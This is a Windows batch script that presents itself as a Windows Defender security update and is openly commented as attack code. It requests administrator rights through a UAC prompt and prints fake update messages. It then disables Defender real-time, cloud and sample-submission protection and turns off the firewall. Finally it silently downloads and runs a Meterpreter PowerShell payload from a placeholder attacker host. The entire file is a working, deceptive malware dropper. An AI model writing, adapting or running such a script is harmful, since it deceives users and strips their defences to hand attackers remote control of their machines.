@echo off
:: Request administrator privileges
:: This line automatically triggers the UAC popup to ask for Admin rights
:: It will give the window a convincing "Windows Security" title.
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

:: --- The actual attack code starts here ---
title Windows Defender Security Update
echo Installing critical security updates. Please wait...

:: 1. Disable Real-time Protection
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

:: 2. Disable Sample Submission
powershell -Command "Set-MpPreference -SubmitSamplesConsent NeverSend"

:: 3. Disable Cloud Protection
powershell -Command "Set-MpPreference -MAPSReporting Disable"

:: 4. Disable Firewall
netsh advfirewall set allprofiles state off

:: 5. Download and Execute your Meterpreter payload silently
echo Downloading patch components...
powershell -WindowStyle Hidden -Command "iex (New-Object System.Net.WebClient).DownloadString('http://YOUR_KALI_IP:8080/payload.ps1')"

:: 6. Close the window
echo Update complete. Rebooting system...
timeout /t 5 /nobreak >nul
exit

